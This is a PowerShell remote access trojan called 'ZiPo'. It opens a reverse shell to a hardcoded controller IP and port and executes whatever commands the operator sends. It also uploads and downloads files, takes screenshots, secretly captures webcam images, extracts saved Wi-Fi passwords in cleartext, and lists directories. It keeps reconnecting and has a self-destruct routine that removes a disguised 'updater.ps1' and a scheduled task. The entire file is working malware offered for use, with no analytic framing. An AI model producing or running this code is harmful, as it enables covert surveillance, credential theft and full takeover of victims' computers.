function Connect-ZiPo {
    $srv = "192.168.50.228"
    $port = 6666
    $currentDir = Get-Location

    function Upload-File($path) {
        if (Test-Path $path) {
            $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($path))
            return "[UPLOAD]::$(Split-Path $path -Leaf)::" + $b64 + "::END"
        } else {
            return "[ERROR]::FILE NOT FOUND: $path"
        }
    }

    function Download-File($filename, $b64) {
        $out = "$env:TEMP\$filename"
        [IO.File]::WriteAllBytes($out, [Convert]::FromBase64String($b64))
        return "[DOWNLOADED] $out"
    }

    function Take-Screenshot {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        $bmp = New-Object Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,
                                         [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
        $graphics = [Drawing.Graphics]::FromImage($bmp)
        $graphics.CopyFromScreen(0, 0, 0, 0, $bmp.Size)
        $path = "$env:TEMP\snap.png"
        $bmp.Save($path, [Drawing.Imaging.ImageFormat]::Png)
        $graphics.Dispose()
        $bmp.Dispose()
        return Upload-File $path
    }

    function Capture-Webcam {
    try {
        # WIA попытка
        $manager = New-Object -ComObject WIA.DeviceManager
        foreach ($deviceInfo in $manager.DeviceInfos) {
            try {
                $dev = $deviceInfo.Connect()
                $img = $dev.Items.Item(1).Transfer()
                $file = "$env:TEMP\webcam_$($deviceInfo.Properties[1].Value).jpg"
                $img.SaveFile($file)
                return Upload-File $file
            }
            catch {
                continue
            }
        }

        # Если WIA не нашла камеры — попытка через ffmpeg
        $ffmpegPath = "ffmpeg"
        $tempImage = "$env:TEMP\webcam_ffmpeg.jpg"

        # Убедимся, что ffmpeg доступен
        $ffmpegCheck = & cmd /c "$ffmpegPath -version" 2>$null
        if ($LASTEXITCODE -eq 0) {
            # Найдём название камеры
            $cameraName = (& cmd /c "$ffmpegPath -list_devices true -f dshow -i dummy" 2>&1) |
                Select-String "DirectShow video devices" -Context 0,10 |
                Where-Object { $_.Line -match '"(.*)"' } |
                ForEach-Object { ($_ -split '"')[1] } |
                Select-Object -First 1

            if ($cameraName) {
                # Снимаем кадр
                Start-Process -FilePath $ffmpegPath -ArgumentList "-f dshow -i video=""$cameraName"" -frames:v 1 `"$tempImage`"" -NoNewWindow -Wait
                if (Test-Path $tempImage) {
                    return Upload-File $tempImage
                }
            }
            return "[ERROR] ffmpeg fallback failed: no camera device detected"
        }
        else {
            return "[ERROR] No usable webcam device found via WIA, and ffmpeg is not available"
        }
    }
    catch {
        return "[ERROR] Webcam capture failed: $($_.Exception.Message)"
    }
}


   function Get-WiFiCreds {
    try {
        $profilesFile = "$env:TEMP\wifi_profiles.txt"
        cmd /c "netsh wlan show profiles > `"$profilesFile`"" | Out-Null
        $lines = Get-Content $profilesFile -Encoding Default

        # Отбираем строки, где есть имя профиля
        $profiles = $lines | Where-Object { $_ -like "*:*" -and $_ -match "Profile" }

        if (-not $profiles -or $profiles.Count -eq 0) {
            return "[INFO] No Wi-Fi profiles found."
        }

        $results = ""
        foreach ($line in $profiles) {
            $parts = $line -split ":", 2
            if ($parts.Count -lt 2) { continue }
            $profile = $parts[1].Trim()

            $results += "`n[$profile]`n"

            $profileFile = "$env:TEMP\wifi_profile_$($profile).txt"
            cmd /c "netsh wlan show profile name=""$profile"" key=clear > `"$profileFile`"" | Out-Null
            $details = Get-Content $profileFile -Encoding Default

            $keyLine = $details | Where-Object {
                $_ -like "*Key Content*" -or $_ -like "*Содержимое ключа*"
            }

            if ($keyLine) {
                $results += ($keyLine -join "`n")
            } else {
                $results += "[!] No key found"
            }
        }

        return $results
    }
    catch {
        return "[ERROR] Failed to retrieve Wi-Fi credentials: $($_.Exception.Message)"
    }
}



    function Get-BrowserCreds {
        return "[INFO] Browser creds not implemented — use external extractor."
    }

    function Tree-List {
        return Get-ChildItem -Path $currentDir -Recurse | Select-Object FullName | Out-String
    }

    function Self-Destruct {
        $script = $PSCommandPath
        if (-not $script) {
            $script = "$env:APPDATA\Microsoft\updater.ps1"
        }
        Remove-Item -Path $script -Force -ErrorAction SilentlyContinue
        schtasks /Delete /TN "ZiPo" /F | Out-Null 2>&1
        exit
    }

    while ($true) {
        try {
            $tcp = [Net.Sockets.TcpClient]::new($srv, $port)
            $stream = $tcp.GetStream()
            [byte[]]$buffer = 0..65535 | % { 0 }

            $esc = [char]27
            $clear = "$esc[2J$esc[H"
            $banner = @"
${esc}[31m
   ________ _______  ________  ________
  |\  _____\\  ___ \|\   __  \|\   ____\
  \ \  \__/ \ \   __<\ \  \|\  \ \  \___|
   \ \   __\ \ \  \_|\ \ \   __  \ \  \   
    \ \  \_|  \ \  \_|\ \ \  \ \  \ \  \____
     \ \__\    \ \_______\ \__\ \__\ \_______\
      \|__|     \|_______|\|__|\|__|\|_______|${esc}[0m

${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
OS: $([System.Environment]::OSVersion.VersionString)
Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
------------------------------------------------------------
"@

            $intro = $clear + $banner + "`nPS $currentDir> "
            $bbytes = [Text.Encoding]::UTF8.GetBytes($intro)
            $stream.Write($bbytes, 0, $bbytes.Length)
            $stream.Flush()

            while (($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
                $cmd = ([Text.Encoding]::UTF8).GetString($buffer, 0, $i).Trim()

                try {
                    if ([string]::IsNullOrWhiteSpace($cmd)) {
                        $response = ""
                    }
                    elseif ($cmd.StartsWith("!get")) {
                        $path = $cmd.Substring(4).Trim()
                        if ([string]::IsNullOrWhiteSpace($path)) {
                            $response = "[ERROR] Usage: !get <full_path_to_file>"
                        } else {
                            $response = Upload-File $path
                        }
                    }
                    elseif ($cmd.StartsWith("!post")) {
                        $parts = $cmd.Split("::")
                        if ($parts.Length -eq 3) {
                            $response = Download-File $parts[1].Trim() $parts[2].Trim()
                        } else {
                            $response = "[ERROR] INVALID POST FORMAT"
                        }
                    }
                    elseif ($cmd -like "cd *") {
                        $target = $cmd.Substring(3).Trim()
                        Set-Location -Path $target
                        $currentDir = Get-Location
                        $response = ""
                    }
                    elseif ($cmd -eq "!sysinfo") {
                        $response = Get-ComputerInfo | Out-String
                    }
                    elseif ($cmd -eq "!sc") {
                        $response = Take-Screenshot
                    }
                    elseif ($cmd -eq "!webcam") {
                        $response = Capture-Webcam
                    }
                    elseif ($cmd -eq "!wifi") {
                        $response = Get-WiFiCreds
                    }
                    elseif ($cmd -eq "!creds") {
                        $response = Get-BrowserCreds
                    }
                    elseif ($cmd -eq "!tree") {
                        $response = Tree-List
                    }
                    elseif ($cmd -eq "!die") {
                        $response = "[!] Self-destruct initiated..."
                        $outBytes = [Text.Encoding]::UTF8.GetBytes($response)
                        $stream.Write($outBytes, 0, $outBytes.Length)
                        $stream.Flush()
                        Self-Destruct
                    }
                    else {
                        $sb = [ScriptBlock]::Create("cd '$currentDir'; $cmd")
                        $output = & $sb 2>&1 | Out-String
                        $response = $output.TrimEnd()
                    }
                }
                catch {
                    $response = "[ERROR] $($_.Exception.Message.ToUpper())"
                }

                # Обновлённое добавление приглашения:
                $response = ($response.TrimEnd() + "`n`nPS $currentDir> ")

                $outBytes = [Text.Encoding]::UTF8.GetBytes($response)
                $stream.Write($outBytes, 0, $outBytes.Length)
                $stream.Flush()
            }

            $stream.Close()
            $tcp.Close()
        }
        catch {
            Start-Sleep -Seconds 5
        }
    }
}

Connect-ZiPo
